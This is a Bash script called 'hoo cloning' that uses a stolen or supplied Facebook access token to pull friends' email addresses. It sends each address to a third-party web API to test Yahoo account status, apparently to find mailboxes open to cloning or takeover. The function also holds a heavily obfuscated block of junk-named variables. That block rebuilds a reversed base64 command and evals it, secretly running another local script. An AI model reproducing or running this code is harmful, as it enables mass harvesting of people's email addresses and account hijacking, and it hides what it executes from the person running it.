#!/bin/bash
# -(c) zsecc0de-crew.id ~ widhisec
# -createon   : 16/04/2019
# -lastupdate : 17/04/2019
# -toolsname  : hoo cloning
clear;
command -v curl > /dev/null 2>&1 || { echo >&2 "cURL not installed [!]"; }
if [[ ! -z $(command -v jq) ]]; then
	printf ""
else
	sleep 2
	apt install grep && apt install jq
	printf "selesai terinstall.\n"
fi
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
NORMAL=$(tput sgr0)
CYAN=$(tput setaf 6)
ti=$(set `date` && echo -e "$4");
function banner () {
printf "
\t$GREEN.__                   
\t|  |__   ____   ____  
\t|  |  \ /  _ \ /  _ \  [${RED}Create By ${CYAN}Widhisec]
\t|   Y  (  <_> |  <_> ) 
\t|___|  /\____/ \____/ 
\t     \/  
\t
"
}
banner
function get_yahoo(){
                   get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$aa" | 
                   jq -r .status)
                   printf "$aa > $get_yahoo" >> output.txt
                   printf "${CYAN}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
}
function hey_kamu () {
	               echo -e -n $RED'[?]'${NORMAL}' Token : ' 
	               read t0k3n
	               echo "tunggu bentar.."
	               if [[ ! -e $t0k3n  ]]; then
	               	   printf "${RED}[!] ${NORMAL}tidak ada file token\n"
	               	   exit
	               fi
                   gEt=$(curl -X GET POST -s "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=5000" | jq -r .data |
                   grep -Po '(?<="email":)[^,]*' | tr -d '""')
                   kAwKxwFIjEiLybvocbaAOMJZqpHbHuYMvIbYcLAwqcRckjastnYxfpOutrRitPuRmNTQTvRFfBVSrTAQyDGPvOfpDzLevzgArBPI="bIialtXalEUxcnocOycNjBNwPNTofXBQtvLMinfFxVUjLwccEVgqJVzQfrkPestzgInXRYvESfSHlYTwxueUxBzZoeoiWFJPeTOh";nApvguxRqVLpzOtuHvHLYLuCfqQUZPpbcEJKmrSZEggmNdRveRkVleiDrPQFPXTdEDbnTOmRgVkHbVBVmDczNJcxoLjhanliQDHw="zoEtpQjRaXoOJNclYZBuqrGcycClmKzmrbEBSByqayeOqIMrcsOTCQNykAdNLdSsNxnXXKITzzcFaPPWwDcPsJdPrzeFCvDdACnk";FuSUMeutpEOavETezXjZXKnZzUdVjLXcfHunwvtQMKqIPsuNJWDzVepvhognFZhgeIlsMhOGZlXIqzRoVFvFyienOrrnPdFBTNss="ch";nIEvkCmlBorHoZSyXIBmhyiKZHHAJSUFbgiLdQQgSWNXHSnZOSAXrNzKnUJOtppyolBLnDaLHzJjMZPWFTqTLlCWpoPBRcGUooWZ="4";VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr="";odcjXFAsqTCkeswogVsIInqhWUBWtcCZLGsmwmooRIvsaOyKBXLLTFXleqMHpKLshSNbBZMdfrzDAYyWfCIDiwsqGTVWswHmZJbz="WWktuSTlpOWCrOBQVEOSALuDCDMFUtbxpVnAhpQzwoDtqIZcHmSoJjJVSlLaaiOPCTBRAMHRaoJQybkBwmYvnwDvDDwmJGcaIYst";zIfkuflujvtuOMNWyKlQNdSjOyQvWGLCGMqfSUOoBGLIHJXdUsozBSCFtlztDVVfhmnPmRpHCRZIUiWUNmSXgsYpICOKwUwXslxS=" =owbkACbhZXZKkiIwRiIgUWLg8GajVGKk0zbKkCaz5yavBCZtACN2U2chJGKk0Dc | r";WoYKLYLdnaYlPHbfzPJGpVcrtLoxkGxzvBeZFWBRoXMuZzoXtkaKMetmepGCIHUXZPQNWDWiftLeSXdkpcQqStFYrmBxHsIkCtne="jGdhZzjqGooiuxItexgAAkoekOYpPnACKcByWtoKVvkKRKPykmtPVvCiBmtogATLjsotEeoMsEcQGtdokMWhstZCsJqArnndYFuy";CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm="";uoggMVuQeBTeCgwAUfkONVOjkasqWJTJVVttqcGoltRqedZPfDyBmrlRYgYqJTjKKhAnmaUDCqrcakqXFabLHsfsIByWLmuFHEfG="as";fKZVTEKYGWmOYTJaMWUumIoEKoAvPbKdFdRVhHqsvickzqqWmdZkRlzwkejYqEItJbHpTZWmMzYZEYLBdkrnlMhOwsOUJPvxWWDR="ParxXiRKCuLeXMsHwcQlRYqhFpDGjdbJNRTdtvFiLlAUpfmmhrBIMTgrmmurcONrqPBalOnPdtMbiAunTECdwwDJiQZfXsIcmCzE";XIFpenzoWfOOaxglDxOUHrlFvpwAATLSfQpwmstiGOvBaAQzfFMNmnOvXrFvpSKIfZXTBHuEhfsvDnBSRzYfYVGfReDRerrTvYmX="sPqbElrGUWHwoPKuYtXOUHomHRLLzJbyCZWFGoqjELaDJUbbWLsXoxHLIRrDASFHzXZjZSrpRDCSaeVBMkLOyHGDVMlZSmLoFAev";GBliZMmbELzZqiccUpwDHApCaMjzhkezihPfDRvcxnoNMUhdRZIYfQYtVXWFFEBkTeyNsCnyvDLdYeycxKWPhoMZaBctEIaLivvc="o";ZTlkcmIrgFEAhvJwZJNknahQmwMPLrNfJAbfaUHgHujiJEZtElrHUJkUfeaSflQxSAbQHTnhMKjbWedJUvVZicsqdDjOehbKJAEl="6";qXpvOBBRBVupLmcPkxaNhulJAIFQHAcKihCFwCjpcnCxrFkSkVhcuAZcTomzpWJPcKWWyECglPafOlfcExRUWxIimPKrpDcPTZtr="PhapkTtgGZXiuDZArbVgoUteDOeBHAuJpzrSJlZkUwrsXIKIVKcfGzBLLMATaouSqpeyYepoILuCVLcZYFeawAfaqpVliyPniVdH";gAZaoaTFoCJBQGAaJvyKAvRNTFlkiqXyOlBaHuddfTUZdfEEAcPqJaLDcgLEoyZxWsMHZRAniquyuddceMmgUyUshCBEwcxRyAae=" -d";ZyxiCplzldFDtwpKtXmkuyQgjjPaTfMTXjazlMmShbGLKYARuVGfthZgoggDtRbUgkctYgMitrlVkPjcMAnxJGxPKZtqQbkmRRgt="inCQeTtxhmVDlyZOhODdfSOiDpfPFHdzOdGphPtTkdfiKlUARNdOCqjnGEOPPLIbBUdMeIyrYoSSluwOEDHKecliAlaCyJlRGiCK";JwZtQhbJtIHoJraoJxPsEzaWHayrPLonJLRJKSeeUfllWPubJejcrvPkZQjIIBcSAWJPjqVASdwdCMBFBdrzvLtuLohNTZMCPstd="";QsdtfIxZTsZELmUrMQglFclAXPFhyJoATbpSwSNMxBRFkZjbRMcleCvFhocKpXjRfBUVFjoAIulGEvmByaoOBNqXRffnbkeKZAch="b";lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp="e";HVVOcJhjlEqRTGCfomWciwXvrfydIPpSVOeWogcIeSBJmdXsLpVVljnTeuSxxvvqyjIsYVDDXaOWihHZItdQEYmqXVoVpyiLSkio="v |";Tx=Eds;qtdJRRfhKPJQjRuGTsIBNvZJkzsnUSJhlEzHwHyTRSKbhSWVnOypvTcwCOYURtEuHcfDYrnJynHBbvVXZDmIEOgegQgBxGCJoFhX="";qujTYzGdjWOcbeuykuegaNwqgnehPnllKUMhMVUPGeRJEUcgkicYPGwMEjLgryLYKxoaglsVMYPwRvCxXRyaUofEfysdOjhyvLwd=$(eval "$CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm$lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp$FuSUMeutpEOavETezXjZXKnZzUdVjLXcfHunwvtQMKqIPsuNJWDzVepvhognFZhgeIlsMhOGZlXIqzRoVFvFyienOrrnPdFBTNss$VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr$GBliZMmbELzZqiccUpwDHApCaMjzhkezihPfDRvcxnoNMUhdRZIYfQYtVXWFFEBkTeyNsCnyvDLdYeycxKWPhoMZaBctEIaLivvc$zIfkuflujvtuOMNWyKlQNdSjOyQvWGLCGMqfSUOoBGLIHJXdUsozBSCFtlztDVVfhmnPmRpHCRZIUiWUNmSXgsYpICOKwUwXslxS$lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp$HVVOcJhjlEqRTGCfomWciwXvrfydIPpSVOeWogcIeSBJmdXsLpVVljnTeuSxxvvqyjIsYVDDXaOWihHZItdQEYmqXVoVpyiLSkio$CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm$QsdtfIxZTsZELmUrMQglFclAXPFhyJoATbpSwSNMxBRFkZjbRMcleCvFhocKpXjRfBUVFjoAIulGEvmByaoOBNqXRffnbkeKZAch$qtdJRRfhKPJQjRuGTsIBNvZJkzsnUSJhlEzHwHyTRSKbhSWVnOypvTcwCOYURtEuHcfDYrnJynHBbvVXZDmIEOgegQgBxGCJoFhX$uoggMVuQeBTeCgwAUfkONVOjkasqWJTJVVttqcGoltRqedZPfDyBmrlRYgYqJTjKKhAnmaUDCqrcakqXFabLHsfsIByWLmuFHEfG$lddgEwsKYoYOJhLnIDeJnWlfFMKHSeoXUVgAcTzzSVjFivlWGgPdMMmnIPipuYrnPzxlSwtzrtYDPpBnyvBUttKOZZJoGhVYydgp$ZTlkcmIrgFEAhvJwZJNknahQmwMPLrNfJAbfaUHgHujiJEZtElrHUJkUfeaSflQxSAbQHTnhMKjbWedJUvVZicsqdDjOehbKJAEl$VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr$nIEvkCmlBorHoZSyXIBmhyiKZHHAJSUFbgiLdQQgSWNXHSnZOSAXrNzKnUJOtppyolBLnDaLHzJjMZPWFTqTLlCWpoPBRcGUooWZ$gAZaoaTFoCJBQGAaJvyKAvRNTFlkiqXyOlBaHuddfTUZdfEEAcPqJaLDcgLEoyZxWsMHZRAniquyuddceMmgUyUshCBEwcxRyAae$qtdJRRfhKPJQjRuGTsIBNvZJkzsnUSJhlEzHwHyTRSKbhSWVnOypvTcwCOYURtEuHcfDYrnJynHBbvVXZDmIEOgegQgBxGCJoFhX");eval "$JwZtQhbJtIHoJraoJxPsEzaWHayrPLonJLRJKSeeUfllWPubJejcrvPkZQjIIBcSAWJPjqVASdwdCMBFBdrzvLtuLohNTZMCPstd$qujTYzGdjWOcbeuykuegaNwqgnehPnllKUMhMVUPGeRJEUcgkicYPGwMEjLgryLYKxoaglsVMYPwRvCxXRyaUofEfysdOjhyvLwd$CeloCjnUhbSmFNpzoHAIVxhCjJdrmkHcujNXqgrQgrEVYuZNrfuOgDXNGSkDQajmJqgjsmXcpfLOKqIulVZmUuGzPKwBTrJZgJjm$VMViirIQJOEqFbKpSfABzyzcftNavvoRRBzFADbhxgnntDnmdpxBBxIvolMGMCqMWxmfoTxhGJaPcKdXaZLczoThufCJkZudUtNr"

}
hey_kamu 
echo "selesai pada jam : $ti"
